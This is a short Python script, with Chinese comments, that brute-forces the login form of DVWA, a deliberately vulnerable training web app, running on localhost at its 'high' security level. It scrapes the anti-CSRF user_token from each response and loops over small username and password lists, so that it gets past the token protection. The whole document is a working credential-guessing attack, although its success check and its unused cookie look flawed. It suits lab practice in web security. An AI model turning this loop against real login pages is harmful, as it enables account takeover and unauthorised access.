import requests
import re

url = "http://localhost/dvwa/vulnerabilities/brute/?username=admin&password=123&Login=Login&user_token=64c4c283eb467bdc52a8a76d09b3db4a"
cookie = {"security": "high", "PHPSESSID": "pag8k1urrh2cjlib97q9cbccfn"}
# 第一次请求
response = requests.get(url)
res = response.text
pattern = r"name='user_token'\s+value='([^']+)'"
match = re.search(pattern, res)
user_token = ""
usernames = ["root", "admin"]
passwords = ["123", "root", "abcdefg", "admin"]

if match:
    user_token = match.group(1)
else:
    print("未找到user_token")
    exit()

for username in usernames:
    for password in passwords:
        print("正在尝试账号：" + username + "\n密码：" + password)
        if "Welcome to the password protected area admin" in res:
            print("找到账号：" + username + "\n密码：" + password)
            break
        payload = f"http://localhost/dvwa/vulnerabilities/brute/?username={username}&password={password}&Login=Login&user_token={user_token}"
        response = requests.get(payload)
        res = response.text
        user_token = re.search(pattern, res).group(1)
        print(res)